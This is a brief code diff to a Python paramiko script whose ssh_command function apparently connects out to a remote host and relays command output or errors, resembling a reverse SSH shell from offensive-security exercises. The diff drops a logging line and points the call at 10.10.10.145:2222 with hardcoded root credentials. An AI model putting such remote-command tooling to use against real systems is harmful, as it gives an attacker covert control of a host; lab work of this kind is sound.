@@ -22,5 +22,5 @@ def ssh_command(ip, user, passwd, command, port = 22):
                 ssh_session.send(str(e))
         client.close()
     return
-paramiko.util.log_to_file("filename.log")
-ssh_command('127.0.0.1', 'root', 'lovepython', 'ClientConnected', 6888)
+
+ssh_command('10.10.10.145', 'root', 'lovepython', 'ClientConnected', 2222)
